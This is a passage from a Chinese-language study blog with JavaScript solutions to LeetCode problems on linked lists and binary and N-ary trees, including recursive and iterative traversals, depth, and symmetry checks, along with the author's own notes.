class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverse</span>(<span class="params">curr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> prev = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">while</span> (curr) &#123;</span><br><span class="line">    <span class="keyword">var</span> next = curr.next;</span><br><span class="line">    curr.next = prev;</span><br><span class="line">    prev = curr;</span><br><span class="line">    curr = next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> prev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode144——删除排序链表中的重复元素-II（☆☆）（★todo）"><a href="#LeetCode144——删除排序链表中的重复元素-II（☆☆）（★todo）" class="headerlink" title="LeetCode144——删除排序链表中的重复元素 II（☆☆）（★todo）"></a>LeetCode144——删除排序链表中的重复元素 II（☆☆）（★todo）</h2><p><a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/">跳转地址</a></p><h3 id="思路1-amp-题解-20"><a href="#思路1-amp-题解-20" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> deleteDuplicates = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> dummy = <span class="keyword">new</span> ListNode();</span><br><span class="line">    dummy.next = head;</span><br><span class="line">    <span class="keyword">let</span> node = dummy;                                                  </span><br><span class="line">    <span class="keyword">while</span> (node.next) &#123;</span><br><span class="line">        <span class="comment">// 下一个和下一个的下一个比, 如果相同, 记录该值</span></span><br><span class="line">        <span class="keyword">if</span> (node.next.next &amp;&amp; node.next.val === node.next.next.val) &#123;  </span><br><span class="line">            <span class="keyword">let</span> nonValNode = node.next.next.next;</span><br><span class="line">            <span class="comment">// 只要下一个值和这值一样，就把当前的下一个指针指向下下个, 否则移动当前位置</span></span><br><span class="line">            <span class="keyword">while</span> (nonValNode &amp;&amp; node.next.val === nonValNode.val) &#123;   </span><br><span class="line">                nonValNode = nonValNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">            node.next = nonValNode;                                    </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            node = node.next;                                          </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-22"><a href="#思路2-amp-题解-22" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> deleteDuplicates = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> tmpHead = <span class="keyword">new</span> ListNode();</span><br><span class="line">    tmpHead.next = head;</span><br><span class="line">    <span class="keyword">let</span> cur = tmpHead;</span><br><span class="line">    <span class="keyword">let</span> visted = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">    <span class="keyword">while</span>(cur.next)&#123;</span><br><span class="line">       <span class="keyword">let</span> counter = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">let</span> val = cur.next.val;</span><br><span class="line">       <span class="keyword">let</span> tmp = cur.next;</span><br><span class="line">       <span class="keyword">while</span>(tmp &amp;&amp; tmp.val == val)&#123;</span><br><span class="line">           counter++;</span><br><span class="line">           tmp =  tmp.next</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(counter &gt; <span class="number">1</span>) cur.next = tmp;</span><br><span class="line">       <span class="keyword">else</span> cur = cur.next; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmpHead.next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="剑指-Offer-II-026——重排链表（☆☆）（★）（todo）"><a href="#剑指-Offer-II-026——重排链表（☆☆）（★）（todo）" class="headerlink" title="剑指 Offer II 026——重排链表（☆☆）（★）（todo）"></a>剑指 Offer II 026——重排链表（☆☆）（★）（todo）</h2><p><a href="https://leetcode-cn.com/problems/LGjMqU/">跳转地址</a></p><h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><h2 id="LeetCode144——二叉树的前序遍历（☆）"><a href="#LeetCode144——二叉树的前序遍历（☆）" class="headerlink" title="LeetCode144——二叉树的前序遍历（☆）"></a>LeetCode144——二叉树的前序遍历（☆）</h2><p><a href="https://leetcode-cn.com/problems/binary-tree-preorder-traversal/">跳转地址</a></p><h3 id="自己的代码-41"><a href="#自己的代码-41" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>知道二叉树的前序遍历，但是第一次实现是真不会啊。</p><h3 id="思路1-amp-题解-21"><a href="#思路1-amp-题解-21" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>递归：</p><ol><li>确定递归函数的参数和返回值。</li><li>确定终止条件。如果当前遍历的节点是空，那么本层递归结束。</li><li>确定单层递归的逻辑。前序遍历是中左右的循序，所以要先取中节点的数值。</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">var</span> preorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root,res=[]</span>) </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (!root) <span class="keyword">return</span> res</span><br><span class="line">     res.push(root.val) <span class="comment">// 根</span></span><br><span class="line">     preorderTraversal(root.left, res) <span class="comment">// 左</span></span><br><span class="line">     preorderTraversal(root.right, res) <span class="comment">// 右</span></span><br><span class="line">     <span class="keyword">return</span> res</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-23"><a href="#思路2-amp-题解-23" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>迭代：</p><p>前序遍历是中左右，每次先处理的是中间节点，那么先将跟节点放入栈中，然后将右孩子加入栈，再加入左孩子。这样出栈的时候就是中左右的顺序。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 入栈 右 -&gt; 左</span></span><br><span class="line"><span class="comment">// 出栈 中 -&gt; 左 -&gt; 右</span></span><br><span class="line"><span class="keyword">var</span> preorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> res;</span><br><span class="line">    <span class="keyword">const</span> stack = [root];</span><br><span class="line">    <span class="keyword">let</span> cur = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span>(stack.length) &#123;</span><br><span class="line">        cur = stack.pop();</span><br><span class="line">        res.push(cur.val);</span><br><span class="line">        cur.right &amp;&amp; stack.push(cur.right);</span><br><span class="line">        cur.left &amp;&amp; stack.push(cur.left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;   </span><br></pre></td></tr></table></figure><h2 id="LeetCode94——二叉树的中序遍历（☆）（★）"><a href="#LeetCode94——二叉树的中序遍历（☆）（★）" class="headerlink" title="LeetCode94——二叉树的中序遍历（☆）（★）"></a>LeetCode94——二叉树的中序遍历（☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal/">跳转地址</a></p><h3 id="自己的代码-42"><a href="#自己的代码-42" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>知道前序遍历后，中序（左根右），后序（左右根）就很简单：（递归）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> inorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> res;</span><br><span class="line">    inorderTraversal(root.left, res); </span><br><span class="line">    res.push(root.val)</span><br><span class="line">    inorderTraversal(root.right, res);</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;;   </span><br></pre></td></tr></table></figure><p>时间复杂度：O(n)，其中 n 为二叉树节点的个数。二叉树的遍历中每个节点会被访问一次且只会被访问一次。</p><h3 id="思路2-amp-题解（★）"><a href="#思路2-amp-题解（★）" class="headerlink" title="思路2&amp;题解（★）"></a>思路2&amp;题解（★）</h3><p>迭代：</p><p>递归的时候隐式地维护了一个栈，而迭代的时候需要显式地将这个栈模拟出来。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> inorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> stack = [];</span><br><span class="line">    <span class="keyword">let</span> cur = root;</span><br><span class="line">    <span class="keyword">while</span> (stack.length || cur) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cur) &#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            <span class="comment">// 遍历到左边最深处</span></span><br><span class="line">            cur = cur.left;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cur = stack.pop();</span><br><span class="line">            res.push(cur.val);</span><br><span class="line">            <span class="comment">// 判断右节点是否存在，若不存在则继续往上pop，直到中间节点，然后放入右节点</span></span><br><span class="line">            cur = cur.right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><h2 id="LeetCode145——二叉树的后序遍历（☆）"><a href="#LeetCode145——二叉树的后序遍历（☆）" class="headerlink" title="LeetCode145——二叉树的后序遍历（☆）"></a>LeetCode145——二叉树的后序遍历（☆）</h2><p><a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal/">跳转地址</a></p><h3 id="自己的代码-43"><a href="#自己的代码-43" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>递归：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> postorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> res;</span><br><span class="line">    postorderTraversal(root.left, res); </span><br><span class="line">    postorderTraversal(root.right, res);</span><br><span class="line">    res.push(root.val)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;;   </span><br></pre></td></tr></table></figure><p>迭代：先序遍历是中左右，后续遍历是左右中。因此只需调整一下先序遍历的代码顺序，变成中右左，再反转res数组。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 入栈 左 -&gt; 右</span></span><br><span class="line"><span class="comment">// 出栈 中 -&gt; 右 -&gt; 左 结果翻转</span></span><br><span class="line"><span class="keyword">var</span> postorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> res;</span><br><span class="line">    <span class="keyword">const</span> stack = [root];</span><br><span class="line">    <span class="keyword">let</span> cur = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span>(stack.length) &#123;</span><br><span class="line">        cur = stack.pop();</span><br><span class="line">        res.push(cur.val);</span><br><span class="line">        cur.left &amp;&amp; stack.push(cur.left);</span><br><span class="line">        cur.right &amp;&amp; stack.push(cur.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.reverse();</span><br><span class="line">&#125;;   </span><br></pre></td></tr></table></figure><h2 id="LeetCode102——二叉树的层序遍历（☆☆）（★★★）"><a href="#LeetCode102——二叉树的层序遍历（☆☆）（★★★）" class="headerlink" title="LeetCode102——二叉树的层序遍历（☆☆）（★★★）"></a>LeetCode102——二叉树的层序遍历（☆☆）（★★★）</h2><p><a href="https://leetcode-cn.com/problems/binary-tree-lever-order-traversal/">跳转地址</a></p><h3 id="自己的代码-44"><a href="#自己的代码-44" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>自己第一次写还是写不出来</p><h3 id="思路1-amp-题解-22"><a href="#思路1-amp-题解-22" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>BFS：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> levelOrder = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> [];</span><br><span class="line">    <span class="keyword">let</span> res = [], queue = [root];</span><br><span class="line">    <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">        <span class="comment">// 记录当前层节点数</span></span><br><span class="line">        <span class="keyword">let</span> length = queue.length;</span><br><span class="line">        <span class="comment">// 存放每一层节点</span></span><br><span class="line">        <span class="keyword">let</span> curLevel = [];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; i++)&#123;</span><br><span class="line">            <span class="keyword">let</span> node = queue.shift();</span><br><span class="line">            curLevel.push(node.val);</span><br><span class="line">            <span class="comment">// 存放当前层下一层的节点</span></span><br><span class="line">            node.left &amp;&amp; queue.push(node.left);</span><br><span class="line">            node.right &amp;&amp; queue.push(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 把每层结果放到res</span></span><br><span class="line">        res.push(curLevel);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-24"><a href="#思路2-amp-题解-24" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>DFS：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> levelOrder = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = [];</span><br><span class="line">    <span class="keyword">var</span> level = <span class="number">0</span>;</span><br><span class="line">    traverse(root, level);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">traverse</span>(<span class="params">root, level</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (level &gt;= result.length) &#123;</span><br><span class="line">            result[level] = [];</span><br><span class="line">        &#125;</span><br><span class="line">        result[level].push(root.val);</span><br><span class="line">        traverse(root.left, level + <span class="number">1</span>);</span><br><span class="line">        traverse(root.right, level + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode637——二叉树的层平均值（☆）（★）"><a href="#LeetCode637——二叉树的层平均值（☆）（★）" class="headerlink" title="LeetCode637——二叉树的层平均值（☆）（★）"></a>LeetCode637——二叉树的层平均值（☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/average-of-levels-in-binary-tree/">跳转地址</a></p><p>层序遍历的基础上</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> res.map(<span class="function">(<span class="params">i</span>) =&gt;</span> i.reduce(<span class="function">(<span class="params">acc, cur</span>) =&gt;</span> acc + cur, <span class="number">0</span>) / i.length);</span><br></pre></td></tr></table></figure><h2 id="LeetCode589——N叉树的前序遍历（☆）"><a href="#LeetCode589——N叉树的前序遍历（☆）" class="headerlink" title="LeetCode589——N叉树的前序遍历（☆）"></a>LeetCode589——N叉树的前序遍历（☆）</h2><p><a href="https://leetcode-cn.com/problems/n-ary-tree-postorder-traversal/">跳转地址</a></p><h3 id="思路1-amp-题解-23"><a href="#思路1-amp-题解-23" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>递归：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> preorder = <span class="function"><span class="keyword">function</span>(<span class="params">root, ans=[]</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> ans</span><br><span class="line">    ans.push(root.val)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> child <span class="keyword">of</span> root.children)</span><br><span class="line">        preorder(child, ans)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-25"><a href="#思路2-amp-题解-25" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>迭代：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> preorder = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!root) <span class="keyword">return</span> res;</span><br><span class="line">  <span class="keyword">let</span> stack = [root];</span><br><span class="line">  <span class="keyword">let</span> cur = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">while</span>(stack.length)&#123;</span><br><span class="line">    cur = stack.pop();</span><br><span class="line">    res.push(cur.val);</span><br><span class="line">    <span class="keyword">if</span> (cur.children) &#123;</span><br><span class="line">      cur.children.reverse();</span><br><span class="line">      stack.push(...cur.children);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if 可替换为：</span></span><br><span class="line">    <span class="comment">// for(let i = node.children.length - 1; i &gt;= 0; i--) &#123;</span></span><br><span class="line">    <span class="comment">//     stack.push(node.children[i]);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode145——N叉树的后序遍历（☆）"><a href="#LeetCode145——N叉树的后序遍历（☆）" class="headerlink" title="LeetCode145——N叉树的后序遍历（☆）"></a>LeetCode145——N叉树的后序遍历（☆）</h2><p><a href="https://leetcode-cn.com/problems/n-ary-tree-postorder-traversal/">跳转地址</a></p><h3 id="思路1-amp-题解-24"><a href="#思路1-amp-题解-24" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>递归：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> postorder = <span class="function"><span class="keyword">function</span> (<span class="params">root, ans = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> ans;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> child <span class="keyword">of</span> root.children)</span><br><span class="line">        postorder(child, ans);</span><br><span class="line">    ans.push(root.val);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-26"><a href="#思路2-amp-题解-26" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>迭代：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> postorder = <span class="function"><span class="keyword">function</span>(<span class="params">root, res = []</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!root) <span class="keyword">return</span> res;</span><br><span class="line">  <span class="keyword">let</span> stack = [root];</span><br><span class="line">  <span class="keyword">let</span> cur = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">while</span>(stack.length)&#123;</span><br><span class="line">    cur = stack.pop();</span><br><span class="line">    <span class="keyword">if</span>(cur.children)&#123;</span><br><span class="line">      stack.push(...cur.children);</span><br><span class="line">    &#125;</span><br><span class="line">    res.push(cur.val);<span class="comment">//因为是后序遍历，所以要把每次弹出的值压放入栈底</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.reverse();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode429——N叉树的层序遍历（☆☆）（★）"><a href="#LeetCode429——N叉树的层序遍历（☆☆）（★）" class="headerlink" title="LeetCode429——N叉树的层序遍历（☆☆）（★）"></a>LeetCode429——N叉树的层序遍历（☆☆）（★）</h2><h3 id="思路-amp-题解-24"><a href="#思路-amp-题解-24" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>迭代：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> levelOrder = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = [], queue = [];</span><br><span class="line">  queue.push(root);</span><br><span class="line">  <span class="keyword">if</span> (!root) <span class="keyword">return</span> res;</span><br><span class="line">  <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">      <span class="keyword">let</span> length = queue.length;</span><br><span class="line">      <span class="keyword">let</span> curLevel = [];</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">          <span class="keyword">let</span> node = queue.shift();</span><br><span class="line">          curLevel.push(node.val);</span><br><span class="line">          node.children &amp;&amp; queue.push(...node.children);</span><br><span class="line">      &#125;</span><br><span class="line">      res.push(curLevel);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode104——二叉树的最大深度（☆）（★）"><a href="#LeetCode104——二叉树的最大深度（☆）（★）" class="headerlink" title="LeetCode104——二叉树的最大深度（☆）（★）"></a>LeetCode104——二叉树的最大深度（☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/">跳转地址</a></p><h3 id="自己的代码-45"><a href="#自己的代码-45" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>二叉树的题目还是很不熟练，这么简单的题目都不会写。。</p><h3 id="思路1-amp-题解-25"><a href="#思路1-amp-题解-25" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>递归：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxDepth = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> left = maxDepth(root.left);</span><br><span class="line">    <span class="keyword">const</span> right = maxDepth(root.right);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.max(left, right) + <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 精简版</span></span><br><span class="line"><span class="keyword">var</span> maxDepth = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> + <span class="built_in">Math</span>.max(maxDepth(root.left), maxDepth(root.right))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再次强调<strong>递归三部曲</strong>：</p><ol><li>确定递归函数的参数和返回值：参数就是传入树的根节点，返回就返回这棵树的深度。</li><li>确定终止条件：如果为空节点的话，就返回0，表示高度为0。</li><li>确定单层递归的逻辑：先求它的左子树的深度，再求的右子树的深度，最后取左右深度最大的数值 再+1 （加1是因为算上当前中间节点）就是目前节点为根节点的树的深度。</li></ol><h3 id="思路2-amp-题解-27"><a href="#思路2-amp-题解-27" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>迭代：</p><p>使用层序遍历，最大的深度就是二叉树的层数。</p><p>代码见：<a href="##LeetCode102%E2%80%94%E2%80%94%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86%EF%BC%88%E2%98%86%E2%98%86%EF%BC%89%EF%BC%88%E9%AB%98%E9%A2%91%EF%BC%89">=&gt;</a></p><h2 id="LeetCode104——二叉树的最小深度（☆）"><a href="#LeetCode104——二叉树的最小深度（☆）" class="headerlink" title="LeetCode104——二叉树的最小深度（☆）"></a>LeetCode104——二叉树的最小深度（☆）</h2><p><a href="https://leetcode-cn.com/problems/minimum-depth-of-binary-tree/">跳转地址</a></p><h3 id="思路1-amp-题解-26"><a href="#思路1-amp-题解-26" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>递归：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> minDepth = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> left = minDepth(root.left);</span><br><span class="line">    <span class="keyword">const</span> right = minDepth(root.right);</span><br><span class="line">    <span class="comment">// 注意 “叶子结点”即左右子树都空，需要做判断。（一棵树只有左节点，那就递归左子树）</span></span><br><span class="line">    <span class="keyword">if</span>(!root.left) <span class="keyword">return</span> right + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(!root.right) <span class="keyword">return</span> left + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.min(left, right) + <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-28"><a href="#思路2-amp-题解-28" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>迭代：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> minDepth = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> queue = [root];</span><br><span class="line">    <span class="keyword">let</span> dep = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> size = queue.length;</span><br><span class="line">        dep++;</span><br><span class="line">        <span class="keyword">while</span>(size--)&#123;</span><br><span class="line">            <span class="keyword">const</span> node = queue.shift();</span><br><span class="line">            <span class="comment">// 到第一个叶子节点 返回 当前深度 </span></span><br><span class="line">            <span class="keyword">if</span>(!node.left &amp;&amp; !node.right) <span class="keyword">return</span> dep;</span><br><span class="line">            node.left &amp;&amp; queue.push(node.left);</span><br><span class="line">            node.right &amp;&amp; queue.push(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode101——对称二叉树（☆）"><a href="#LeetCode101——对称二叉树（☆）" class="headerlink" title="LeetCode101——对称二叉树（☆）"></a>LeetCode101——对称二叉树（☆）</h2><p><a href="https://leetcode-cn.com/problems/symmetric-tree/">跳转地址</a></p><h3 id="自己的代码-46"><a href="#自己的代码-46" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>不会做，如果硬写只会根据数组的2的n次方分割然后判断是不是对称。按层序遍历也很难判断。</p><h3 id="思路1-amp-题解-27"><a href="#思路1-amp-题解-27" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>其实我们要比较的是两个树（这两个树是根节点的左右子树），所以在递归遍历的过程中，也要同时遍历两棵树。</p><p><strong>一个树的遍历顺序是左右中，一个树的遍历顺序是右左中。</strong></p><p><img src="https://i.loli.net/2021/07/29/KOA89QFnphP7C6S.png" alt="image.png"></p><p>递归三部曲</p><ul><li><p>确定递归函数的参数和返回值。参数是左子树节点和右子树节点，返回值是bool类型。</p></li><li><p>确定终止条件。</p><ul><li>左节点为空，右节点不为空，return false</li><li>左不为空，右为空， return false</li><li>左右都为空，return true</li></ul><p>此时已经排除掉了节点为空的情况，那么剩下的就是左右节点不为空：</p><ul><li>左右都不为空，比较节点数值，不相同 return false</li><li>否则 return true</li></ul></li><li><p>确定单层递归的逻辑。单层递归的逻辑就是处理 右节点都不为空，且数值相同的情况。</p><ul><li>比较二叉树外侧是否对称：传入的是左节点的左孩子，右节点的右孩子。</li><li>比较内侧是否对称，传入左节点的右孩子，右节点的左孩子。</li><li>如果左右都对称就返回true ，有一侧不对称就返回false 。</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isSymmetric = <span class="function"><span class="keyword">function</span> (<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">const</span> compareNode = <span class="function"><span class="keyword">function</span>(<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">        <span class="comment">//2. 确定终止条件 注意val相等不是终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(left === <span class="literal">null</span> &amp;&amp; right !== <span class="literal">null</span> || left !== <span class="literal">null</span> &amp;&amp; right === <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left === <span class="literal">null</span> &amp;&amp; right === <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left.val !== right.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.确定单层递归逻辑</span></span><br><span class="line">        <span class="keyword">let</span> outSide = compareNode(left.left, right.right);</span><br><span class="line">        <span class="keyword">let</span> inSide = compareNode(left.right, right.left);</span><br><span class="line">        <span class="keyword">return</span> outSide &amp;&amp; inSide;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> compareNode(root.left, root.right);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-29"><a 